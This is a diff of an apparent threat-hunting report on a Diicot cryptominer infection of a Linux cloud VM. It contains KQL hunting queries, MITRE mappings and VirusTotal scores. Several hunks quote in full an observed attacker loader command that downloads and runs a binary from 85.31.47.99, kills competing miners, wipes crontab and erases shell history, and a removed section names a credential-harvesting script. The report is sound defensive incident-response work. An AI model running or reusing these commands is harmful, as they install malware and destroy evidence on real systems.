@@ -155,7 +155,7 @@ bash -c "cd /var/tmp/.update-logs ; chmod +x /var/tmp/.update-logs/.bisis ; ulim
 **Associated Device:**  
 `sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
 
-**Timeframe:**  
+**Time Detected:**  
 `March 14, 2025 @ 18:48 UTC`
 
 <!--
@@ -275,29 +275,29 @@ DeviceFileEvents
 
 **Command Observed:**
 ```bash
-./network "rm -rf /var/tmp/Documents ; \
-mkdir /var/tmp/Documents 2>&1 ; \
-crontab -r ; \
-chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1 ; \
-cd /var/tmp ; \
-chattr -iae /var/tmp/Documents/.diicot ; \
-pkill Opera ; pkill cnrig ; pkill java ; killall java ; \
-pkill xmrig ; killall cnrig ; killall xmrig ; \
-cd /var/tmp/ ; \
-mv /var/tmp/diicot /var/tmp/Documents/.diicot ; \
-mv /var/tmp/kuak /var/tmp/Documents/kuak ; \
-cd /var/tmp/Documents ; \
-chmod +x .* ; \
-/var/tmp/Documents/.diicot >/dev/null 2>&1 & disown ; \
-history -c ; \
-rm -rf .bash_history ~/.bash_history ; \
-rm -rf /tmp/cache ; \
-cd /tmp/ ; \
-wget -q 85.31.47.99/.NzJjOTYwxx5/.balu || curl -O -s -L 85.31.47.99/.NzJjOTYwxx5/.balu ; \
-mv .balu cache ; \
-chmod +x cache ; \
-./cache >/dev/null 2>&1 & disown ; \
-history -c ; \
+./network "rm -rf /var/tmp/Documents ; 
+mkdir /var/tmp/Documents 2>&1 ; 
+crontab -r ; 
+chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1 ; 
+cd /var/tmp ; 
+chattr -iae /var/tmp/Documents/.diicot ; 
+pkill Opera ; pkill cnrig ; pkill java ; killall java ; 
+pkill xmrig ; killall cnrig ; killall xmrig ; 
+cd /var/tmp/ ; 
+mv /var/tmp/diicot /var/tmp/Documents/.diicot ; 
+mv /var/tmp/kuak /var/tmp/Documents/kuak ; 
+cd /var/tmp/Documents ; 
+chmod +x .* ; 
+/var/tmp/Documents/.diicot >/dev/null 2>&1 & disown ; 
+history -c ; 
+rm -rf .bash_history ~/.bash_history ; 
+rm -rf /tmp/cache ; 
+cd /tmp/ ; 
+wget -q 85.31.47.99/.NzJjOTYwxx5/.balu || curl -O -s -L 85.31.47.99/.NzJjOTYwxx5/.balu ; 
+mv .balu cache ; 
+chmod +x cache ;
+./cache >/dev/null 2>&1 & disown ; 
+history -c ; 
 rm -rf .bash_history ~/.bash_history"
 ```
 
@@ -306,7 +306,7 @@ rm -rf .bash_history ~/.bash_history"
 **Associated Device:**  
 `sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
 
-**Timeframe:**  
+**Time Detected:**  
 `March 14, 2025 @ 18:46 UTC`
 
 **Details:**
@@ -331,7 +331,7 @@ DeviceNetworkEvents
   <img src="https://github.com/user-attachments/assets/01004535-b8d4-4c0d-bda5-b4e83b2d8620" alt="./network" width="800"/>
 </p>
 
-**Note:** Presence of `diicot`, `kuak`, and `cache` in `InitiatingProcessCommandLine` prompted deeper investigation of this command.
+**Note:** Presence of `diicot`, `kuak`, and `cache` in `InitiatingProcessCommandLine` prompted deeper investigation of the `./network` loader's execution.
 
 ```kql
 let Files = dynamic(["diicot", "kuak", "cache"]);
@@ -398,11 +398,12 @@ DeviceFileEvents
   <img src="https://github.com/user-attachments/assets/034f2a65-993e-4f4f-88c8-35306e0649df" alt="./network" width="375"/>
 </p>
 
-**Note:** The `./retea` command was identified during deeper investigation into the origin of the `./network` script execution.
+**Note:** The `./retea` script was identified during deeper investigation into the origin of the `./network` loader's execution.
 
 **VirusTotal Scores:**  
-- `payload` (from dinpasiune.com): `43/64` — crypto miner  
-- `retea`: `38/64` — credential harvester and loader
+- `payload` (from dinpasiune.com): `43/64` 
+- `retea`: `38/64`
+- `dinpasiune.com`: `17/94`
 
 **Likely Role:**  
 Credential harvester and secondary loader used to prepare system for mining and persistence
@@ -414,140 +415,6 @@ Credential harvester and secondary loader used to prepare system for mining and 
 - `T1070.004` — Indicator Removal on Host: File Deletion
 
 ---
-<!--
-### Finding #5 — Execution of `./retea` Script for Credential Harvesting and Payload Launch
-
-**Command Observed:**
-```bash
-./retea -c 'key=$1; user=$2; if [[ $key == "KOFVwMxV7k7XjP7fwXPY6Cmp16vf8EnL54650LjYb6WYBtuSs3Zd1Ncr3SrpvnAU" ]];... Haceru'
-```
-[View full command → `observed-commands.md`](./observed-commands.md#bisis-repeated-execution-command)
-
-**Associated Device:**  
-`sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
-
-**Timeframe:**  
-`March 14, 2025 @ 18:46 UTC`
-
-**Behavior Observed:**  
-- Script launches a multi-stage payload chain that removes competing malware, wipes cron jobs, and downloads a binary (`payload`) from `dinpasiune.com`  
-- Deletes history files and SSH keys to conceal activity  
-- Harvests system users and generates a brute-force password list (`pass`) using common patterns  
-- **Also triggers execution of the `./network` script**, which is further analyzed in the next finding due to its central role in cryptominer deployment
-
-**Query Used:**
-```kql
-DeviceProcessEvents
-| where InitiatingProcessCommandLine contains "./retea"
-| project Timestamp, DeviceName, InitiatingProcessCommandLine
-```
-
-> 🖼️ *Insert Screenshot: Process tree showing `./retea` and downstream payload execution*
-
-**VirusTotal Scores:**  
-- `payload` (from dinpasiune.com): `43/64` — crypto miner  
-- `retea`: `38/64` — credential harvester and loader
-
-**Likely Role:**  
-Credential harvester and secondary loader used to prepare system for mining and persistence
-
-**Mapped MITRE Techniques:**  
-- `T1110.001` — Brute Force: Password Guessing  
-- `T1059` — Command and Scripting Interpreter  
-- `T1036` — Masquerading  
-- `T1070.004` — Indicator Removal on Host: File Deletion
-
----
-
-### Finding #6 — Deployment of Diicot Cryptominer via `./network` Loader
-
-**Command Observed:**
-```bash
-./network "rm -rf /var/tmp/Documents ; \
-mkdir /var/tmp/Documents 2>&1 ; \
-crontab -r ; \
-chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1 ; \
-cd /var/tmp ; \
-chattr -iae /var/tmp/Documents/.diicot ; \
-pkill Opera ; pkill cnrig ; pkill java ; killall java ; \
-pkill xmrig ; killall cnrig ; killall xmrig ; \
-cd /var/tmp/ ; \
-mv /var/tmp/diicot /var/tmp/Documents/.diicot ; \
-mv /var/tmp/kuak /var/tmp/Documents/kuak ; \
-cd /var/tmp/Documents ; \
-chmod +x .* ; \
-/var/tmp/Documents/.diicot >/dev/null 2>&1 & disown ; \
-history -c ; \
-rm -rf .bash_history ~/.bash_history ; \
-rm -rf /tmp/cache ; \
-cd /tmp/ ; \
-wget -q 85.31.47.99/.NzJjOTYwxx5/.balu || curl -O -s -L 85.31.47.99/.NzJjOTYwxx5/.balu ; \
-mv .balu cache ; \
-chmod +x cache ; \
-./cache >/dev/null 2>&1 & disown ; \
-history -c ; \
-rm -rf .bash_history ~/.bash_history"
-```
-
-**Note:** This command was observed in the March 14 `ConnectionRequests` query.
-
-**Associated Device:**  
-`sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net`
-
-**Timeframe:**  
-`March 14, 2025 @ 18:46 UTC`
-
-**Details:**
-- `./network` functions as a loader and cleanup script  
-- Deletes and recreates `/var/tmp/Documents` as a staging area  
-- Executes `.diicot` and `.kuak`, then downloads and runs `.balu` (renamed to `cache`)  
-- Kills known miner processes (`xmrig`, `cnrig`, `Opera`, `java`) to remove competition  
-- Clears shell and bash history to erase evidence  
-- Modifies SSH configs and uses obfuscated paths to evade detection
-
-**Queries Used:**
-```kql
-DeviceNetworkEvents
-| where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
-| where Timestamp between (datetime(2025-03-14T16:41:22.631607Z) .. datetime(2025-03-14T20:46:16.607719Z))
-| where InitiatingProcessCommandLine contains "./network"
-| where ActionType == "ConnectionRequest"
-| project Timestamp, DeviceName, ActionType, RemoteIP, RemotePort, InitiatingProcessCommandLine
-```
-
-<p align="center">
-  <img src="https://github.com/user-attachments/assets/01004535-b8d4-4c0d-bda5-b4e83b2d8620" alt="./network" width="800"/>
-</p>
-
-**Note:** Presence of `diicot`, `kuak`, and `cache` in `InitiatingProcessCommandLine` prompted deeper investigation of this command.
-
-```kql
-let Files = dynamic(["diicot", "kuak", "cache"]);
-DeviceFileEvents
-| where DeviceName == "sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net"
-| where Timestamp between (datetime(2025-03-14T16:41:22.631607Z) .. datetime(2025-03-14T20:46:16.607719Z))
-| where FileName has_any(Files)
-```
-
-<p align="center">
-  <img src="https://github.com/user-attachments/assets/50b894e5-8d5d-4613-a153-271be77ab166" alt="./network" width="600"/>
-  <img src="https://github.com/user-attachments/assets/2a0cd76e-78c4-4f13-aaa5-11b2325b242b" alt="UpzBUBnv" width="320"/>
-  <img src="https://github.com/user-attachments/assets/72410e77-c048-4aa6-8df0-ebfa109db5e9" alt="./network" width="275"/>
-  <img src="https://github.com/user-attachments/assets/ea24de2f-0e57-4327-8bef-ffd34af025f8" alt="UpzBUBnv" width="250"/>
-</p>
-
-**Note:** Two process trees were observed — one for `diicot` (top-right) and one for `kuak` (bottom). An unfamiliar `./retea` command also appears and was addressed in the previous finding.
-
-**VirusTotal Scores:**  
-- `.diicot`: `21/64`  
-- `.kuak`: `30/64`  
-- `.balu` (renamed to `cache`): `33/64`  
-
-**Mapped MITRE Techniques:**  
-- `T1059` — Command and Scripting Interpreter  
-- `T1070.004` — Indicator Removal: File Deletion  
-- `T1036` — Masquerading  
-- `T1564.001` — Hidden Files and Directories
 
 
 
